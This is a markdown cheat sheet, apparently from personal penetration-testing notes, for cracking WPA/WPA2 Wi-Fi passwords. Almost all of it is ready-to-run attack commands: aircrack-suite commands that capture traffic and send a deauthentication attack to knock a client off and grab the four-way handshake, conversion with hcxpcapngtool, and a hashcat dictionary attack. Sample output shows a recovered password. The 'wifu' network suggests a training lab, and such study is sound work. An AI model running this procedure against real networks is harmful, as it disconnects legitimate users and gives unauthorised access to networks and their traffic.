# Hashcat (WPA/WPA2)

## Commands

* Run [setup](../../setup.md) first
* Two terminals are needed
* At least on client associated with the AP

```bash
# [Terminal One]
# Set interface to monitor mode
sudo airmon-ng start $INTERFACE

# Start monitoring to collect data
sudo airodump-ng -c $CHANNEL --bssid $BSSID -w $TAG --output-format pcap $INTERFACE

# [Terminal Two]
# Run the deauthentication attack to get four-way handshake
sudo aireplay-ng --deauth 1 -a $BSSID -c $CLIENT $INTERFACE

# Wait for the four-way handshake to appear in airodump-ng window.

# Stop it
qq
```

## Hashcat Stuff

```bash
# Show information about platform and processors
hashcat -I

# Get some help because it's needed :)
hashcat --help

# Do some benchmarking -- careful here
hashcat -b -m 22000

# Install utilities (usually already on Kali)
sudo apt-get install hashcat-utils -y
sudo apt-get install hcxpcapngtool -y

# Convert PCAP to hash format understood by hashcat
sudo hcxpcapngtool -o hash.hc22000 -E $WORDLIST $PCAP

# Cat cracks hashes
hashcat -m 22000 hash.hc22000 $WORDLIST

# Computer starts screaming ...
# Output
hashcat (v6.2.6) starting

OpenCL API (OpenCL 3.0 PoCL 3.1+debian  Linux, None+Asserts, RELOC, SPIR, LLVM 15.0.6, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
==================================================================================================================================================
* Device #1: pthread-sandybridge-11th Gen Intel(R) Core(TM) i7-11700K @ 3.60GHz, 1433/2930 MB (512 MB allocatable), 4MCU

Minimum password length supported by kernel: 8
Maximum password length supported by kernel: 63

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Single-Hash
* Single-Salt
* Slow-Hash-SIMD-LOOP

Watchdog: Temperature abort trigger set to 90c

Host memory required for this attack: 0 MB

Dictionary cache built:
* Filename..: /usr/share/john/password.lst
* Passwords.: 3561
* Bytes.....: 26343
* Keyspace..: 3561
* Runtime...: 0 secs

Approaching final keyspace - workload adjusted.

6b05fe2fe4d6a8d9aa49d7761323e70b:009fa924b928:74da38ca5991:wifu:password123

Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 22000 (WPA-PBKDF2-PMKID+EAPOL)
Hash.Target......: hash.hc22000
Time.Started.....: Sat Jun 17 01:36:30 2023 (1 sec)
Time.Estimated...: Sat Jun 17 01:36:31 2023 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/john/password.lst)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:     1829 H/s (5.16ms) @ Accel:128 Loops:512 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 3561/3561 (100.00%)
Rejected.........: 2921/3561 (82.03%)
Restore.Point....: 2705/3561 (75.96%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: prometheus -> password123
Hardware.Mon.#1..: Util: 26%

Started: Sat Jun 17 01:36:07 2023
Stopped: Sat Jun 17 01:36:31 2023
```

## References

* [Hashcat](https://hashcat.net/hashcat/)
* [Hashcat Utilities](https://hashcat.net/wiki/doku.php?id=hashcat_utils)
